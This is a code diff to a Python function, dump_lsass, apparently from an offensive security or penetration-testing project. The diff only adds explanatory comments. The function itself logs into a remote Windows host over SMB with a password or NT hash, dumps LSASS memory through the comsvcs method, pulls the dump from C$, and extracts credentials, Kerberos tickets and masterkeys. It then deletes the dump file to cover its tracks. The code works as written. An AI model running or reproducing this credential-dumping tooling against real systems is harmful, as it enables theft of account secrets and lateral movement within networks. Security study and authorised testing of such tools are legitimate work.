@@ -8,8 +8,10 @@ import sys
 from pympacket.models.common import User
 
 def dump_lsass(target, username, domain, password='', nthash=''):
+    """Dumps the lsass process memory space and extracts credentials of curretly logged users"""
     logging.disable(sys.maxsize) # Disable lsassy logger (noisy)
 
+    # Start an SMB session against the target computer
     session = Session()
     session.get_session(
         address=target,
@@ -24,21 +26,25 @@ def dump_lsass(target, username, domain, password='', nthash=''):
         print("Couldn't connect to remote host.\n", file=sys.stderr)
         return None
     
+    # Create an instance of the Dumper class, which will dump the lsass process by using the 'comsvcs' method
     dumper = Dumper(session, timeout=5, time_between_commands=1).load(dump_module='comsvcs')
-    file = dumper.dump(dump_name="sasso.dmp")
+    file = dumper.dump(dump_name="sasso.dmp") # Dump lsass
     if file is None:
         print("Unable to dump lsass, maybe you don't have admin privileges.\n", file=sys.stderr)
         return None
     
+    # Save the dump in C:\Windows\Temp\sasso.dmp
     file = ImpacketFile(session).open(share="C$", timeout=5, file="sasso.dmp", path="\\Windows\\Temp\\")
     if file is None:
         print("Unable to open lsass dump, might have been removed by host's antivirus.\n", file=sys.stderr)
         return None
     
+    # Parse the dump to extract credentials
     credentials, tickets, masterkeys = Parser(target, file).parse()
     file.close()
 
-    result = ImpacketFile.delete(session, file.get_file_path(), timeout=5) # Doesn't work at the moment
+    # Remove the dump from disk on the target computer
+    result = ImpacketFile.delete(session, file.get_file_path(), timeout=5)
     #if result is None:
     #    print("Unable to delete dump from remote system.")
 
